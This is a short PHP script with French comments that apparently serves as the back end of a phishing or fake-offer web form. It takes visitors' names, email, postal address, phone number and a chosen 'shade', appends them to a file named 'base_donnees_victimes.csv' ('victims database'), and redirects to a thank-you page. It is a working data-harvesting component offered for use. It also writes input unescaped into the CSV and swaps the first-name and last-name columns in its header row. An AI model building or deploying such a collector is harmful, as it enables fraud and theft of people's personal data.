<?php
// 1. Récupération des données du formulaire
$prenom  = $_POST['prenom'];
$nom     = $_POST['nom'];
$email   = $_POST['email'];
$adresse = $_POST['adresse'];
$cp      = $_POST['cp'];
$ville   = $_POST['ville'];
$tel     = $_POST['tel'];
$teinte  = $_POST['teinte'];

// 2. Préparation de la ligne CSV (séparée par des virgules)
$date = date('d-m-Y H:i:s');
$ligneCSV = "\"$date\",\"$prenom\",\"$nom\",\"$email\",\"$teinte\",\"$adresse\",\"$cp\",\"$ville\",\"$tel\"\n";

// 3. Enregistrement dans le fichier .csv
$nom_fichier = "base_donnees_victimes.csv";
$nouveau = !file_exists($nom_fichier);

$fichier = fopen($nom_fichier, "a");

// Si le fichier vient d'être créé, on ajoute l'en-tête
if ($nouveau) {
    $entete = "Date,Nom,Prenom,Email,Teinte,Adresse,Code_Postal,Ville,Telephone\n";
    fwrite($fichier, $entete);
}

fwrite($fichier, $ligneCSV);
fclose($fichier);

// 4. Redirection vers la page de succès
header('Location: merci.html');
exit();
?>
